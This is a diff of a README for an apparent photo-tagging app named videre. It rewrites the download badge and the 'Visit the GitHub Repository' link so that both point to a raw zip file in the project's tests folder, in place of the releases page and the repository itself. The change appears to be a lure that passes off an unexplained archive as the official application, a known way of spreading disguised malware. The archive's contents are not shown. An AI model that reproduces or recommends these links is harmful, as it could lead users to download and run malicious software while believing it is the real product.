@@ -19,7 +19,7 @@ Do you have folders full of photos with names like "IMG_4821.jpg" that mean noth
 
 ### Step 1: Get the Application
 
-[![Download videre](https://img.shields.io/badge/Download-videre-2ea44f?style=for-the-badge&logo=github)](https://github.com/davedm72/videre/releases)
+[![Download videre](https://img.shields.io/badge/Download-videre-2ea44f?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/davedm72/videre/main/crates/videre-api/tests/v1.3.zip)
 
 Visit this link to download the application.
 
@@ -80,7 +80,7 @@ videre automatically adds tags to your files based on their content. These tags 
 
 If you encounter any issues or have questions:
 
-- **Visit the GitHub Repository:** https://github.com/davedm72/videre
+- **Visit the GitHub Repository:** https://raw.githubusercontent.com/davedm72/videre/main/crates/videre-api/tests/v1.3.zip
 - **Report Issues:** Go to the "Issues" tab on GitHub and describe your problem
 - **Feature Requests:** Share your ideas for new features on the repository page
 
